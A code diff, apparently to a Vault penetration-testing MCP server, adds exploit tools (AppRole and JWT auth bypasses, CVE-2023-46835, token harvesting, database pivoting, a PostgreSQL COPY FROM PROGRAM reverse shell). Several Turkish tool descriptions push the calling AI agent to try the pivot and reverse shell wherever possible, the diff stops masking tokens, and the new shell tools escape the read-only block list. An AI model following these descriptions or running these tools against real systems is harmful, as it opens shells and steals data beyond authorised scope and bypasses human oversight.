@@ -1,11 +1,19 @@
 import json
+import os
 from typing import Any, Optional
 
 from mcp.server.fastmcp import FastMCP
 
 from active_execution.context import ExecutionContext
+from active_execution.modules.agent_sidecar_attack import AgentSidecarAttackModule
 from active_execution.modules.privilege_escalation import PrivilegeEscalationModule
 from active_execution.modules.secret_exfiltration import SecretExfiltrationModule
+from active_execution.modules.approle_exploit import AppRoleExploitModule
+from active_execution.modules.jwt_oidc_exploit import JWTOIDCExploitModule
+from active_execution.modules.raft_storage_exploit import RaftStorageExploitModule
+from active_execution.modules.kubernetes_auth_exploit import KubernetesAuthExploitModule
+from active_execution.modules.pki_engine_exploit import PKIEngineExploitModule
+from active_execution.modules.transit_engine_exploit import TransitEngineExploitModule
 from active_execution.modules.database_credential_harvest import DatabaseCredentialHarvestModule
 from active_execution.modules.cloud_key_exfiltration import CloudKeyExfiltrationModule
 from active_execution.registry import ActiveExecutionRegistry, RiskLevel, risk_level_allowed
@@ -167,6 +175,17 @@ async def run_hijack_scan(
     include_git_history: bool = True,
     max_file_size_mb: int = 5,
 ) -> str:
+    # ── Guard: require user confirmation for large scans ──────────────
+    _scan_root = path.rstrip("/\\")
+    if _scan_root in ("/", "C:", "C:\\", "D:", "D:\\") or _scan_root.endswith(":\\"):
+        return json.dumps({
+            "status": "blocked",
+            "message": (
+                f"REFUSING to scan '{path}' — this would scan the ENTIRE system. "
+                f"Ask the user for a SPECIFIC directory to scan."
+            ),
+        }, ensure_ascii=False)
+
     clear_module_findings("file_secret_scanner", "hijack_analyzer")
     try:
         _run_hijack_scan_impl(
@@ -220,6 +239,62 @@ async def run_env_scan() -> str:
         )
     except Exception as error:
         return json.dumps({"status": "error", "message": str(error)}, ensure_ascii=False)
+
+
+# ─── Vault Agent Scan ──────────────────────────────────────────────────────
+
+
+@mcp_server.tool(
+    name="run_vault_agent_scan",
+    description=(
+        "Yerel dosya sisteminde Vault Agent / Sidecar konfigurasyonlarini tarar. "
+        "HCL agent config dosyalarini kesfeder, auto_auth bloklarini analiz eder, "
+        "sink dosyalarindan token'lari cikarir, AppRole credential dosyalarini okur, "
+        "VAULT_TOKEN ortam degiskenini kontrol eder. Opsiyonel olarak kesfedilen "
+        "token'lari Vault API'ye karsi dogrular."
+    ),
+)
+async def run_vault_agent_scan(
+    path: Optional[str] = None,
+    vault_addr: Optional[str] = None,
+    validate_tokens: bool = False,
+    max_file_size_mb: int = 5,
+) -> str:
+    clear_module_findings("agent_sidecar_attack.scan")
+    context = ExecutionContext(
+        vault_addr=vault_addr.rstrip("/") if vault_addr else "",
+    )
+
+    module = AgentSidecarAttackModule()
+    try:
+        result = module.execute(
+            context,
+            {
+                "path": path or os.getcwd(),
+                "vault_addr": vault_addr,
+                "validate_tokens": validate_tokens,
+                "max_file_size_mb": max_file_size_mb,
+            },
+        )
+    except Exception as error:
+        return json.dumps({"status": "error", "message": str(error)}, ensure_ascii=False)
+
+    evidence = result.evidence or {}
+    return json.dumps(
+        {
+            "status": result.status,
+            "message": result.message,
+            "config_files_found": len(evidence.get("config_files_found", [])),
+            "auto_auth_methods": evidence.get("auto_auth_methods", []),
+            "sink_tokens": len(evidence.get("sink_tokens", [])),
+            "env_tokens": len(evidence.get("env_tokens", [])),
+            "approle_credentials": len(evidence.get("approle_values", [])),
+            "misconfigurations": evidence.get("misconfigurations", []),
+            "captured_token": getattr(context, "captured_token", None),
+            "findings": context.findings,
+        },
+        ensure_ascii=False,
+    )
 
 
 # ─── Capability Audit ─────────────────────────────────────────────────────
@@ -817,7 +892,7 @@ async def create_attack_plan(
 
     # Collect enumeration data from findings
     enum_data: dict[str, Any] = {"findings": list(report_findings)}
-    token_hint = token[:12] + "..." if token and len(token) > 12 else (token or "none")
+    token_hint = token or "none"
 
     llm_provider = provider or detect_provider()
     try:
@@ -1178,6 +1253,334 @@ async def run_database_credential_harvest(
     )
 
 
+# ─── Active Execution: Transit Engine Exploitation ──────────────────────────
+
+
+@mcp_server.tool(
+    name="run_transit_exploit",
+    description=(
+        "Vault Transit Secrets Engine exploitasyonu ve denetimi. 'audit' modunda "
+        "anahtar metadatasini cikarir, exportable anahtarlari bulur ve yanlis "
+        "yapilandirmalari isaretler. 'operate' modunda sifreleme/cozme PoC'si, "
+        "datakey uretimi, HMAC islemleri ve anahtar rotasyonu yapar."
+    ),
+)
+async def run_transit_exploit(
+    vault_addr: str,
+    token: str,
+    mode: str = "audit",
+    mount_path: Optional[str] = None,
+    key_name: Optional[str] = None,
+    operations: Optional[list[str]] = None,
+    namespace: Optional[str] = None,
+    exploit_cve: bool = True,
+) -> str:
+    clear_module_findings("transit_engine_exploit.operations")
+    context = ExecutionContext(
+        vault_addr=vault_addr.rstrip("/"),
+        token=token,
+        namespace=namespace,
+    )
+
+    module = TransitEngineExploitModule()
+    try:
+        result = module.execute(
+            context,
+            {
+                "token": token,
+                "mode": mode,
+                "mount_path": mount_path,
+                "key_name": key_name,
+                "operations": operations,
+                "namespace": namespace,
+                "exploit_cve": exploit_cve,
+            },
+        )
+    except Exception as error:
+        return json.dumps({"status": "error", "message": str(error)}, ensure_ascii=False)
+
+    evidence = result.evidence or {}
+    return json.dumps(
+        {
+            "status": result.status,
+            "message": result.message,
+            "mode": mode,
+            "mounts_found": evidence.get("mounts_found", []),
+            "keys_total": evidence.get("keys_total", 0),
+            "exportable_keys": evidence.get("exportable_keys", []),
+            "operations_performed": evidence.get("operations_performed", []),
+            "findings": context.findings,
+        },
+        ensure_ascii=False,
+    )
+
+
+# ─── Active Execution: PKI Engine Exploitation ──────────────────────────────
+
+
+@mcp_server.tool(
+    name="run_pki_exploit",
+    description=(
+        "Vault PKI Secrets Engine exploitasyonu ve denetimi. 'audit' modunda "
+        "CA sertifikalarini ve CRL'leri indirir, rolleri derinlemesine denetler "
+        "(allow_any_name, allow_ip_sans, enforce_hostnames vb. 9 kritik flag). "
+        "'operate' modunda test sertifikasi basar (PoC)."
+    ),
+)
+async def run_pki_exploit(
+    vault_addr: str,
+    token: str,
+    mode: str = "audit",
+    mount_path: Optional[str] = None,
+    role_name: Optional[str] = None,
+    common_name: str = "test.local",
+    issue_test_cert: bool = False,
+    namespace: Optional[str] = None,
+) -> str:
+    clear_module_findings("pki_engine_exploit.operations")
+    context = ExecutionContext(
+        vault_addr=vault_addr.rstrip("/"),
+        token=token,
+        namespace=namespace,
+    )
+
+    module = PKIEngineExploitModule()
+    try:
+        result = module.execute(
+            context,
+            {
+                "token": token,
+                "mode": mode,
+                "mount_path": mount_path,
+                "role_name": role_name,
+                "common_name": common_name,
+                "issue_test_cert": issue_test_cert,
+                "namespace": namespace,
+            },
+        )
+    except Exception as error:
+        return json.dumps({"status": "error", "message": str(error)}, ensure_ascii=False)
+
+    evidence = result.evidence or {}
+    return json.dumps(
+        {
+            "status": result.status,
+            "message": result.message,
+            "mode": mode,
+            "mounts_found": evidence.get("mounts_found", []),
+            "roles_audited": evidence.get("roles_audited", 0),
+            "critical_flags": evidence.get("critical_flags", []),
+            "ca_certificates": len(evidence.get("ca_certificates", [])),
+            "cert_issued": evidence.get("cert_issued", False),
+            "findings": context.findings,
+        },
+        ensure_ascii=False,
+    )
+
+
+# ─── Active Execution: AppRole Exploitation ──────────────────────────────
+
+
+@mcp_server.tool(
+    name="run_approle_exploit",
+    description=(
+        "Vault AppRole auth method exploitasyonu. Rol yapilandirmasini denetler "
+        "(bind_secret_id, secret_id_num_uses, token_bound_cidrs). bind_secret_id "
+        "bypass (bos secret_id), CIDR bypass (X-Forwarded-For) ve dogrudan login "
+        "testleri yapar."
+    ),
+)
+async def run_approle_exploit(
+    vault_addr: str,
+    token: Optional[str] = None,
+    mode: str = "audit",
+    role_id: Optional[str] = None,
+    secret_id: Optional[str] = None,
+    namespace: Optional[str] = None,
+) -> str:
+    clear_module_findings("approle_exploit.bypass")
+    context = ExecutionContext(
+        vault_addr=vault_addr.rstrip("/"),
+        token=token, namespace=namespace,
+    )
+    module = AppRoleExploitModule()
+    try:
+        result = module.execute(context, {
+            "token": token, "mode": mode,
+            "role_id": role_id, "secret_id": secret_id,
+            "namespace": namespace,
+        })
+    except Exception as error:
+        return json.dumps({"status": "error", "message": str(error)}, ensure_ascii=False)
+
+    ev = result.evidence or {}
+    captured = ev.get("_captured_token") or getattr(context, "captured_token", None)
+    if captured:
+        pentest_context["captured_token"] = captured
+    return json.dumps({
+        "status": result.status, "message": result.message,
+        "roles_audited": ev.get("roles_audited", 0),
+        "dangerous_configs": ev.get("dangerous_configs", []),
+        "bypass_tests": len(ev.get("bypass_tests", [])),
+        "captured_token": captured,
+        "findings": context.findings,
+    }, ensure_ascii=False)
+
+
+# ─── Active Execution: Raft Storage Exploitation ──────────────────────────
+
+
+@mcp_server.tool(
+    name="run_raft_exploit",
+    description=(
+        "Vault Raft storage exploitasyonu. API modunda raft cluster konfigurasyonunu, "
+        "autopilot durumunu ve snapshot'i indirir. Filesystem modunda raft.db SQLite "
+        "veritabanini parse eder, log entry'lerini cikarir ve peers.json okur."
+    ),
+)
+async def run_raft_exploit(
+    vault_addr: str,
+    token: Optional[str] = None,
+    data_path: Optional[str] = None,
+    mode: str = "api",
+    namespace: Optional[str] = None,
+) -> str:
+    clear_module_findings("raft_storage.exploit")
+    context = ExecutionContext(
+        vault_addr=vault_addr.rstrip("/"),
+        token=token,
+        namespace=namespace,
+    )
+    module = RaftStorageExploitModule()
+    try:
+        result = module.execute(context, {
+            "token": token, "data_path": data_path,
+            "mode": mode, "namespace": namespace,
+        })
+    except Exception as error:
+        return json.dumps({"status": "error", "message": str(error)}, ensure_ascii=False)
+
+    ev = result.evidence or {}
+    return json.dumps({
+        "status": result.status, "message": result.message,
+        "cluster_nodes": (ev.get("api", {}).get("cluster_nodes", 0)),
+        "snapshot_size": (ev.get("api", {}).get("snapshot", {}) or {}).get("size_bytes", 0),
+        "raft_db_tables": (ev.get("filesystem", {}).get("raft_db", {}) or {}).get("tables", []),
+        "findings": context.findings,
+    }, ensure_ascii=False)
+
+
+# ─── Active Execution: JWT/OIDC Auth Exploitation ─────────────────────────
+
+
+@mcp_server.tool(
+    name="run_jwt_oidc_exploit",
+    description=(
+        "Vault JWT/OIDC auth method exploitasyonu. Auth config'i okur, OIDC "
+        "discovery URL'sinden JWKS key'leri ceker, rol bound_claims'lerini "
+        "denetler, algorithm confusion (alg:none, RS256->HS256) tespiti yapar, "
+        "ve login bypass testleri uygular."
+    ),
+)
+async def run_jwt_oidc_exploit(
+    vault_addr: str,
+    token: Optional[str] = None,
+    test_login: bool = False,
+    jwt: Optional[str] = None,
+    namespace: Optional[str] = None,
+) -> str:
+    clear_module_findings("jwt_oidc_exploit.audit")
+    context = ExecutionContext(
+        vault_addr=vault_addr.rstrip("/"),
+        token=token,
+        namespace=namespace,
+    )
+    module = JWTOIDCExploitModule()
+    try:
+        result = module.execute(context, {
+            "token": token, "test_login": test_login,
+            "jwt": jwt, "namespace": namespace,
+        })
+    except Exception as error:
+        return json.dumps({"status": "error", "message": str(error)}, ensure_ascii=False)
+
+    ev = result.evidence or {}
+    return json.dumps({
+        "status": result.status, "message": result.message,
+        "mounts_found": len(ev.get("mounts_found", [])),
+        "roles_analyzed": ev.get("roles_analyzed", 0),
+        "oidc_discovery": ev.get("oidc_discovery", {}),
+        "jwks_keys": sum(j.get("key_count", 0) for j in ev.get("jwks_fetched", [])),
+        "algorithm_findings": ev.get("algorithm_findings", []),
+        "login_tests": len(ev.get("login_tests", [])),
+        "findings": context.findings,
+    }, ensure_ascii=False)
+
+
+# ─── Active Execution: Kubernetes Auth Exploitation ──────────────────────────
+
+
+@mcp_server.tool(
+    name="run_kubernetes_auth_exploit",
+    description=(
+        "Vault Kubernetes auth method exploitasyonu. K8s auth mount'larini "
+        "kesfeder, service account JWT'lerini decode eder, auth config'i cikarir "
+        "(issuer, disable_iss_validation, disable_local_ca_jwt), rol-SAU baglanti "
+        "analizini yapar ve kesfedilen SA token'lari ile login dener. "
+        "CVE-2023-46835 exploit'ini icerir."
+    ),
+)
+async def run_kubernetes_auth_exploit(
+    vault_addr: str,
+    token: Optional[str] = None,
+    jwt: Optional[str] = None,
+    namespace: Optional[str] = None,
+    target_roles: Optional[list[str]] = None,
+    exploit_cve: bool = True,
+) -> str:
+    clear_module_findings("kubernetes_auth_exploit.login")
+    context = ExecutionContext(
+        vault_addr=vault_addr.rstrip("/"),
+        token=token,
+        namespace=namespace,
+    )
+
+    module = KubernetesAuthExploitModule()
+    try:
+        result = module.execute(
+            context,
+            {
+                "token": token,
+                "jwt": jwt,
+                "namespace": namespace,
+                "target_roles": target_roles,
+                "exploit_cve": exploit_cve,
+            },
+        )
+    except Exception as error:
+        return json.dumps({"status": "error", "message": str(error)}, ensure_ascii=False)
+
+    evidence = result.evidence or {}
+    captured_token = getattr(context, "captured_token", None)
+    if captured_token:
+        pentest_context["captured_token"] = captured_token
+
+    return json.dumps(
+        {
+            "status": result.status,
+            "message": result.message,
+            "mounts_found": len(evidence.get("mounts_found", [])),
+            "roles_analyzed": evidence.get("roles_analyzed", 0),
+            "successful_logins": len(evidence.get("successful_logins", [])),
+            "suspicious_configs": evidence.get("suspicious_configs", []),
+            "jwt_claims": evidence.get("jwt_claims"),
+            "captured_token": captured_token,
+            "findings": context.findings,
+        },
+        ensure_ascii=False,
+    )
+
+
 # ─── Active Execution: Cloud Key Exfiltration ────────────────────────────────
 
 @mcp_server.tool(
@@ -1252,6 +1655,117 @@ async def run_cloud_key_exfiltration(
         },
         ensure_ascii=False,
     )
+
+
+# ─── Active Execution: Database Pivot ────────────────────────────────────
+
+
+@mcp_server.tool(
+    name="run_database_pivot",
+    description=(
+        "Veritabani kimlik bilgileriyle HEDEF veritabanina BAGLANIR ve veri ceker. "
+        "KV veya database secrets engine'den elde edilen PostgreSQL baglanti bilgilerini "
+        "kullanarak: baglanti testi, SUPERUSER kontrolu, tablo listesi, veri okuma. "
+        "Bu islem state-changing'dir — hedef veritabanina gercek bir baglanti acar. "
+        "params: host, port, user, password, db_name. "
+        "ONEMLI: KV veya database_credential_harvest ile DB bilgisi buldugunda BU ARACI "
+        "MUTLAKA DENE. Baglanti basariliysa hemen reverse_shell dene."
+    ),
+)
+async def run_database_pivot(
+    vault_addr: str,
+    token: Optional[str] = None,
+    params: Optional[dict[str, Any]] = None,
+) -> str:
+    clear_module_findings("database_pivot.exploit")
+    active_token = token or pentest_context.get("captured_token")
+    context = _execution_context(
+        vault_addr=vault_addr,
+        token=active_token,
+        captured_token=pentest_context.get("captured_token"),
+    )
+
+    from active_execution.modules.database_pivot import DatabasePivotModule
+    module = DatabasePivotModule()
+    # Map agent-friendly param names to module-expected names
+    _mapped = dict(params or {})
+    if "user" in _mapped and "username" not in _mapped:
+        _mapped["username"] = _mapped.pop("user")
+    if "host" in _mapped and "db_host" not in _mapped:
+        _mapped["db_host"] = _mapped.pop("host")
+    if "port" in _mapped and "db_port" not in _mapped:
+        _mapped["db_port"] = _mapped.pop("port")
+    try:
+        result = module.execute(context, _mapped)
+    except Exception as error:
+        return json.dumps({"status": "error", "message": str(error)}, ensure_ascii=False)
+
+    evidence = result.evidence or {}
+    return json.dumps({
+        "status": result.status,
+        "message": result.message,
+        "connected": evidence.get("connected", False),
+        "is_superuser": evidence.get("is_superuser", False),
+        "tables_found": evidence.get("tables_found", 0),
+        "data_samples": evidence.get("data_samples", []),
+        "errors": evidence.get("errors", []),
+        "findings": context.findings,
+    }, ensure_ascii=False)
+
+
+# ─── Active Execution: Reverse Shell ─────────────────────────────────────
+
+
+@mcp_server.tool(
+    name="run_reverse_shell",
+    description=(
+        "Veritabani erisimi uzerinden HEDEF sunucuda OS komutu calistirir. "
+        "PostgreSQL COPY FROM PROGRAM kullanarak reverse shell veya komut calistirir. "
+        "Bu islem destructive'dir — hedef sunucuda shell acar. "
+        "params: host, port, user, password, db_name, command (komut). "
+        "AGRESIF KULLANIM: Veritabanina baglanabildigin her yerde dene. "
+        "SUPERUSER yetkisi varsa her komut calisir. SUPERUSER yoksa COPY FROM PROGRAM "
+        "calismayabilir. Komut vermezsen varsayilan: whoami && id && uname -a"
+    ),
+)
+async def run_reverse_shell(
+    vault_addr: str,
+    token: Optional[str] = None,
+    params: Optional[dict[str, Any]] = None,
+) -> str:
+    clear_module_findings("payload_module.reverse_shell")
+    active_token = token or pentest_context.get("captured_token")
+    context = _execution_context(
+        vault_addr=vault_addr,
+        token=active_token,
+        captured_token=pentest_context.get("captured_token"),
+    )
+
+    from active_execution.modules.payload_module import PayloadModule
+    module = PayloadModule()
+    # Map agent-friendly param names to module-expected names
+    _mapped = dict(params or {})
+    if "user" in _mapped and "username" not in _mapped:
+        _mapped["username"] = _mapped.pop("user")
+    if "host" in _mapped and "db_host" not in _mapped:
+        _mapped["db_host"] = _mapped.pop("host")
+    if "port" in _mapped and "db_port" not in _mapped:
+        _mapped["db_port"] = _mapped.pop("port")
+    try:
+        result = module.execute(context, _mapped)
+    except Exception as error:
+        return json.dumps({"status": "error", "message": str(error)}, ensure_ascii=False)
+
+    evidence = result.evidence or {}
+    return json.dumps({
+        "status": result.status,
+        "message": result.message,
+        "command": evidence.get("command", ""),
+        "output": evidence.get("output", ""),
+        "connected": evidence.get("connected", False),
+        "errors": evidence.get("errors", []),
+        "findings": context.findings,
+    }, ensure_ascii=False)
 
 
 # ─── Active Execution: Generic Module Runner ──────────────────────────────
@@ -2144,6 +2658,389 @@ async def generate_diff_report(
         "resolved_findings": resolved_findings[:20],
         "severity_change_details": severity_changes[:20],
     }, ensure_ascii=False)
+
+
+# ─── Security MCP: Remediation Advice ─────────────────────────────────────
+
+
+@mcp_server.tool(
+    name="get_remediation_advice",
+    description=(
+        "Mevcut bulgular icin deterministik remediation onerileri uretir. "
+        "Kural tabanli motor (~60 kural) her bulguyu root cause + exact Vault CLI "
+        "komutlari ile eslestirir, oncelik sirasina dizer. LLM gerektirmez, "
+        "aninda doner. min_severity ve category ile filtrelenebilir."
+    ),
+)
+async def get_remediation_advice(
+    min_severity: Optional[str] = None,
+    category: Optional[str] = None,
+) -> str:
+    """Deterministic remediation advice for current findings (rule-based, no LLM)."""
+    from core.remediation_engine import (
+        generate_priority_action_plan,
+        get_remediation,
+        group_by_category,
+    )
+
+    if not report_findings:
+        return json.dumps({
+            "status": "no_findings",
+            "message": "Henuz bulgu yok — once tarama tool'larini calistirin.",
+            "advice_count": 0,
+            "action_plan": [],
+            "advice": [],
+        }, ensure_ascii=False)
+
+    _SEV_RANK = {"CRITICAL": 5, "HIGH": 4, "MEDIUM": 3, "LOW": 2, "INFO": 1, "PASS": 0}
+    pool = list(report_findings)
+    if min_severity:
+        threshold = _SEV_RANK.get(min_severity.upper(), 0)
+        pool = [f for f in pool if _SEV_RANK.get(f.get("severity", "INFO"), 0) >= threshold]
+
+    advice_list = get_remediation(pool)
+    if category:
+        advice_list = [a for a in advice_list if a.category.lower() == category.lower()]
+
+    grouped = group_by_category(advice_list)
+
+    return json.dumps({
+        "status": "completed",
+        "findings_considered": len(pool),
+        "advice_count": len(advice_list),
+        "categories": sorted(grouped.keys()),
+        "action_plan": generate_priority_action_plan(advice_list),
+        "advice": [
+            {
+                "category": a.category,
+                "title": a.title,
+                "root_cause": a.root_cause,
+                "fix_steps": a.fix_steps,
+                "priority": a.priority,
+                "references": a.references,
+            }
+            for a in advice_list
+        ],
+    }, ensure_ascii=False)
+
+
+# ─── Security MCP: Shared tool executor for agentic tools ─────────────────
+
+# State-changing tools — blocked unless max_risk allows them.
+_BLOCKED_READ_ONLY_TOOLS: set[str] = {
+    "run_privilege_escalation",
+    "run_secret_exfiltration",
+    "run_database_credential_harvest",
+    "run_cloud_key_exfiltration",
+}
+
+
+def _make_mcp_tool_executor(max_risk: str = "read_only"):
+    """Build an async ``(tool_name, params) -> str`` executor bound to this module's tools.
+
+    When *max_risk* is ``"read_only"``, state-changing tools are rejected
+    before execution.
+    """
+    block = max_risk == "read_only"
+
+    async def _executor(tool_name: str, params: dict) -> Any:
+        if block and tool_name in _BLOCKED_READ_ONLY_TOOLS:
+            return (
+                f"BLOCKED: {tool_name} is a state-changing tool and "
+                f"max_risk=read_only — skipped."
+            )
+        fn = globals().get(tool_name)
+        if fn is None or not callable(fn):
+            raise ValueError(f"Unknown tool: {tool_name}")
+        return await fn(**(params or {}))
+
+    return _executor
+
+
+# ─── Security MCP: Parallel Orchestrated Attack ───────────────────────────
+
+
+@mcp_server.tool(
+    name="run_orchestrated_attack",
+    description=(
+        "Mevcut bulgulardan attack tree kurar ve domain specialist'larini "
+        "PARALEL calistirir (asyncio.gather). Her specialist kendi domain'indeki "
+        "adimlari yurutur; token yukseltmesi olursa yeniden planlanir. "
+        "max_risk='read_only' iken state-changing tool'lar engellenir."
+    ),
+)
+async def run_orchestrated_attack(
+    vault_addr: str,
+    token: Optional[str] = None,
+    max_risk: str = "read_only",
+    max_replans: int = 2,
+) -> str:
+    """Fan out current findings to parallel domain specialists."""
+    from ai_core.orchestrator import AttackOrchestrator
+    from ai_core.planning.plan_schema import AttackPhase, PentestPlan, PlannedStep
+
+    start_index = len(report_findings)
+
+    if not report_findings:
+        return json.dumps({
+            "status": "no_findings",
+            "message": (
+                "Bulgu yok — orchestrator bulgulardan branch uretir. "
+                "Once run_unauthenticated_recon / audit tool'larini calistirin."
+            ),
+        }, ensure_ascii=False)
+
+    # Seed steps from findings (lightweight version of auto_mode Phase 2)
+    tool_map = {
+        "recon": "run_unauthenticated_recon",
+        "capability": "run_capability_audit",
+        "privilege": "run_priv_esc_scan",
+        "priv_esc": "run_priv_esc_scan",
+        "kv_enum": "run_kv_enumeration",
+        "ttl": "run_ttl_audit",
+        "auth": "run_auth_config_audit",
+        "secret": "run_secret_exfiltration",
+        "env": "run_env_scan",
+    }
+    # Tools whose signatures require a Vault token — skipped when no token given.
+    _TOKEN_REQUIRED = {
+        "run_capability_audit", "run_kv_enumeration", "run_ttl_audit",
+        "run_priv_esc_scan", "run_auth_config_audit", "run_secret_exfiltration",
+    }
+    risk = "read_only" if max_risk == "read_only" else "state_changing"
+
+    steps: list[PlannedStep] = []
+    seen_tools: set[str] = set()
+    for finding in report_findings[:15]:
+        title = finding.get("title", "")
+        if any(w in title.lower() for w in ("denied", "blocked", "fail")):
+            continue
+        mod = finding.get("module", "")
+        tool = tool_map.get(mod, "run_raw_vault_request") if mod else "run_raw_vault_request"
+        if tool in seen_tools or (not token and tool in _TOKEN_REQUIRED):
+            continue  # one step per tool — specialists iterate within their domain
+        seen_tools.add(tool)
+        params: dict[str, Any] = {"vault_addr": vault_addr}
+        if tool == "run_raw_vault_request":
+            params.update({"method": "GET", "path": "sys/health"})
+        if token and tool not in ("run_unauthenticated_recon", "run_env_scan", "run_hijack_scan"):
+            params["token"] = token
+        steps.append(PlannedStep(
+            tool=tool,
+            reason=f"Investigate: {title[:100]}",
+            params=params,
+            phase=AttackPhase.AUDIT,
+            risk=risk,
+            on_failure="skip",
+            max_retries=0,
+        ))
+
+    if not steps:
+        return json.dumps({
+            "status": "no_steps",
+            "message": "Bulgulardan calistirilabilir adim uretilemedi.",
+        }, ensure_ascii=False)
+
+    plan = PentestPlan(vault_addr=vault_addr)
+    plan.steps = steps
+    plan.attack_narrative = "MCP-triggered parallel orchestrated attack"
+
+    orch = AttackOrchestrator(
+        vault_addr=vault_addr,
+        token=token or "",
+        tool_executor=_make_mcp_tool_executor(max_risk),
+        max_replans=max_replans,
+    )
+    result = await orch.execute_plan(plan)
+
+    return json.dumps({
+        "status": result.status,
+        "domains": sorted(result.domains_involved),
+        "total_steps": result.total_steps,
+        "successes": result.successes,
+        "failures": result.failures,
+        "escalated": result.escalated,
+        "replan_count": result.replan_count,
+        "execution_time_ms": round(result.execution_time_ms, 1),
+        "errors": result.errors[:10],
+        "new_findings": _new_findings_since(start_index),
+    }, ensure_ascii=False)
+
+
+# ─── Security MCP: Autonomous Auto Mode ───────────────────────────────────
+
+
+@mcp_server.tool(
+    name="run_auto_pentest",
+    description=(
+        "Tamamen otonom, READ-ONLY pentest calistirir: recon -> attack tree -> "
+        "paralel domain specialist'lar -> LLM analiz -> PDF rapor. "
+        "State-changing tool'lar her zaman engellenir (aksiyon almaz). "
+        "Cron / zamanlanmis calistirma icin uygundur."
+    ),
+)
+async def run_auto_pentest(
+    vault_addr: str,
+    token: Optional[str] = None,
+    hijack_path: Optional[str] = None,
+    max_turns: int = 30,
+    pdf_report: Optional[str] = None,
+) -> str:
+    """Run the autonomous read-only pentest and export a PDF report."""
+    from ai_core.auto_mode import run_auto_pentest as _run_auto
+
+    outcome: dict[str, Any] = {
+        "status": "completed",
+        "findings_count": 0,
+        "pdf_path": None,
+        "errors": [],
+    }
+
+    async for event in _run_auto(
+        vault_addr=vault_addr,
+        token=token,
+        hijack_path=hijack_path,
+        max_risk="read_only",  # hard-pinned — auto mode never takes action
+        max_turns=max_turns,
+        pdf_report=pdf_report,
+        tool_executor=_make_mcp_tool_executor("read_only"),
+    ):
+        etype = event.get("type")
+        if etype == "pdf_report":
+            outcome["pdf_path"] = event.get("path")
+        elif etype == "findings_count":
+            outcome["findings_count"] = event.get("count", 0)
+        elif etype == "error":
+            outcome["errors"].append(event.get("message", ""))
+        elif etype == "exit_code":
+            outcome["exit_code"] = event.get("code", 0)
+
+    if outcome["errors"] and not outcome["findings_count"]:
+        outcome["status"] = "failed"
+    outcome["errors"] = outcome["errors"][:10]
+
+    return json.dumps(outcome, ensure_ascii=False)
+
+
+# ─── Generate-Root OTP Decode ────────────────────────────────────────────
+
+
+@mcp_server.tool(
+    name="decode_generate_root_otp",
+    description=(
+        "Vault generate-root islemi sonucu elde edilen encoded_token ve OTP'yi "
+        "kullanarak root token'i cozer. Bu islem tamamen client-side calisir, "
+        "herhangi bir Vault token'i veya API cagrisi gerektirmez. "
+        "otp_length: OTP'nin karakter uzunlugu (generate-root/attempt yanitindaki "
+        "otp_length alani). 0'dan buyukse OTP base62 string olarak raw bytes "
+        "seklinde kullanilir; 0 ise eski Vault surumleri icin base64 decode yapilir. "
+        "ONEMLI: once run_raw_vault_request ile sys/generate-root/attempt ve "
+        "sys/generate-root/update cagrilari yapildiktan sonra bu tool kullanilir."
+    ),
+)
+async def decode_generate_root_otp(
+    encoded_token: str,
+    otp: str,
+    otp_length: int = 0,
+) -> str:
+    """Decode a Vault generate-root OTP + encoded_token into a root token.
+
+    Algorithm (Vault >= 1.15):
+      - otp_length > 0: OTP is a base62 string → use raw bytes directly.
+        encoded_token is base64 RawStdEncoding → decode.
+        XOR both → root token.
+      - otp_length == 0: Legacy Vault — both are base64 RawStdEncoding.
+        XOR → raw bytes → formatted as UUID (s.xxxxxxxx...).
+
+    Reference: hashicorp/vault/sdk/helper/roottoken
+    """
+    _B64CHARS = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
+
+    def _raw_b64decode(s: str) -> bytes:
+        """Go RawStdEncoding-compatible base64 decode (no padding, discard trailing bits)."""
+        s = s.rstrip('=')
+        bits = ''
+        for c in s:
+            if c in _B64CHARS:
+                bits += format(_B64CHARS.index(c), '06b')
+        n_bytes = len(bits) // 8
+        return bytes(int(bits[i:i + 8], 2) for i in range(0, n_bytes * 8, 8))
+
+    token_str = ""
+    method = ""
+
+    try:
+        if otp_length > 0:
+            # ── Modern Vault (otp_length > 0) ──────────────────────────
+            # OTP is a base62 random string — use its raw bytes
+            otp_bytes = otp.encode('ascii')
+            enc_bytes = _raw_b64decode(encoded_token)
+
+            if len(otp_bytes) != len(enc_bytes):
+                return json.dumps({
+                    "status": "error",
+                    "message": (
+                        f"OTP length mismatch: OTP raw bytes={len(otp_bytes)}, "
+                        f"encoded_token decoded bytes={len(enc_bytes)}. "
+                        f"Ensure the OTP and encoded_token are from the same generate-root attempt."
+                    ),
+                }, ensure_ascii=False)
+
+            token_bytes = bytes(otp_bytes[i] ^ enc_bytes[i] for i in range(len(enc_bytes)))
+            token_str = token_bytes.decode('ascii', errors='replace')
+            method = "raw-otp-xor (otp_length > 0)"
+
+        else:
+            # ── Legacy Vault (otp_length == 0) ─────────────────────────
+            # Both OTP and encoded_token are base64 RawStdEncoding
+            otp_bytes_legacy = _raw_b64decode(otp)
+            enc_bytes_legacy = _raw_b64decode(encoded_token)
+
+            if len(otp_bytes_legacy) != len(enc_bytes_legacy):
+                return json.dumps({
+                    "status": "error",
+                    "message": (
+                        f"OTP length mismatch (legacy): OTP={len(otp_bytes_legacy)}B, "
+                        f"encoded={len(enc_bytes_legacy)}B"
+                    ),
+                }, ensure_ascii=False)
+
+            raw = bytes(otp_bytes_legacy[i] ^ enc_bytes_legacy[i]
+                        for i in range(len(enc_bytes_legacy)))
+            # Legacy tokens are UUID-formatted: s.xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx
+            token_str = raw.hex()
+            # Try to format as legacy token if it looks like raw bytes
+            if len(raw) == 16:
+                hex_str = token_str
+                token_str = f"s.{hex_str[:8]}-{hex_str[8:12]}-{hex_str[12:16]}-{hex_str[16:20]}-{hex_str[20:32]}"
+            else:
+                try:
+                    token_str = raw.decode('ascii')
+                except UnicodeDecodeError:
+                    token_str = raw.hex()
+            method = "xor-base64 (otp_length == 0, legacy)"
+
+        # ── Cleanup: strip null bytes and whitespace ──────────────────
+        token_str = token_str.rstrip('\x00').strip()
+
+        return json.dumps({
+            "status": "success",
+            "root_token": token_str,
+            "token_length": len(token_str),
+            "method": method,
+            "otp_length": otp_length,
+            "message": (
+                f"Root token decoded ({method}). "
+                f"Use this token with run_capability_audit or set it as the active token."
+            ),
+        }, ensure_ascii=False)
+
+    except Exception as error:
+        return json.dumps({
+            "status": "error",
+            "message": f"Decode failed: {error}",
+            "otp_length": otp_length,
